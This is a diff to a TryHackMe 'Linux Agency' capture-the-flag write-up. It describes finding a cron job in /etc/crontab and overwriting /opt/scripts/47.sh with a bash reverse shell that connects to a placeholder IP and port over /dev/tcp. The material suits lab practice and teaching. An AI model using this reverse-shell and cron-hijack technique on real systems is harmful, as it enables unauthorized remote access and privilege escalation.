@@ -92,7 +92,10 @@ writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/
 	git log
 	```
 
+---
+
 # Task 4
+
 
 ### Diana's flag
 
@@ -117,4 +120,24 @@ echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
 
 And wait till the scheduled process runs the script file.  
 
-##### 
+#### The Hint based way
+
+The hint on `tryhackme` says to wait a train or something, the works with schedules, and the scheduled things on Linux is the `crontabs`, and you can find the `crontab` files by this command....
+
+```bash
+find / -name crontab 2>/dev/null
+```
+
+At this point we are good, but we found a lot of `crontab` files, the file`/etc/crontab` manages the system wide `crontabs` and if we displayed what's in it by `cat`:
+
+```bash
+cat /etc/crontab
+```
+
+we will find that there is a scheduled process to run a script called `47.sh` in the directory `/opt/scripts`, so like the previous solution let's put the `bash` reverse shell script in it and wait till the script runs.
+
+```bash
+echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
+```
+
+---
